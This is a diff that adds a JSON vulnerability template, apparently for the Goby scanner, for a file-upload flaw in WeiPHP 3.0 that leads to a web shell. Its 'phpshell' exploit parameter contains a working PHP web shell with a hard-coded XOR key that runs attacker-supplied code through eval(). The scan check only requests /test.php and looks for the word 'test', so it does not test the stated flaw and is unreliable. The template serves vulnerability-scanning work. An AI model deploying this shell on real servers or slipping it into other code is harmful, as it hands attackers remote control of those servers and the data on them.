@@ -1,0 +1,74 @@
+{
+  "Name": "WeiPHP 3.0 session_id File Upload Getshell",
+  "Description": "Unauthorized upload of any file",
+  "Product": "WeiPHP",
+  "Homepage": "http://www.weiphp.cn/",
+  "DisclosureDate": "2021-06-16",
+  "Author": "hututued",
+  "GobyQuery": "app=\"WeiPHP\"",
+  "Level": "3",
+  "Impact": "<p>Any file upload, you can get the server permissions</p>",
+  "Recommendation": "<p>Upgrade to the latest official version<br></p>",
+  "References": [
+    "https://www.uedbox.com/post/13255/"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "phpshell",
+      "type": "input",
+      "value": "<?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\n$data=file_get_contents(\"php://input\");\nif ($data!==false){\n    $data=encode($data,$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n\t\teval($payload);\n        echo encode(@run($data),$key);\n    }else{\n        if (stripos($data,\"getBasicsInfo\")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": [
+    "File Upload"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
